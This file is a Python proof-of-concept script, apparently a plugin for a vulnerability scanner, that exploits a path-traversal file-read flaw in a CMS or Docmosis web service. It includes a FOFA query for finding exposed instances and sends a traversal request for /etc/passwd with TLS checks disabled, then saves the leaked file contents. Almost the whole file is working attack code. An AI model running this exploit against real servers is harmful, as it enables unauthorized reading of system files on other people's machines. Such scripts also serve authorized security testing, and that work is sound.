#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/wTrRnSWg6OsQ5R-A333aCw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '龙卷风科技cms存在文件读取',

      'level'     :   'medium',

      'FOFA'      :   'body="Welcome to Docmosis Web Services"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/24',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/../fetch?filename=/../../../../../etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret